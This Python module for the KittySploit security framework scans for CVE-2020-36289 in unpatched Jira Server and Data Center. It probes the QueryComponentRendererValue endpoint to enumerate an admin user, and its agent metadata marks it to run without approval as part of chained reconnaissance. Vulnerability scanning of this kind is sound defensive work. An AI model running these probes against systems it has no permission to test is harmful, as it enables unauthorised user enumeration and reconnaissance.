#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira Server and Data Center is susceptible to information disclosure."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jira Server and Data Center - Information Disclosure Detection',
        'description': 'Jira Server and Data Center is susceptible to information disclosure. An attacker can enumerate users via the QueryComponentRendererValue!Default.jspa endpoint and thus potentially access sensitive information, modify data, and/or execute unauthorized operations, Affected versions are before version 8.5.13, from version 8.6.0 before 8.13.5, and from version 8.14.0 before 8.15.1.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'jira', 'atlassian', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/ptswarm/status/1402644004781633540',
            'https://jira.atlassian.com/browse/JRASERVER-71559',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-36289',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2020-36289',
    }

    def run(self):
        for path in ('/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin', '/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('rel=\\"admin\\"',)
            header_any = ('application/json',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Jira Server and Data Center - Information Disclosure detected",
                    path=path,
                )
                return True
        return False

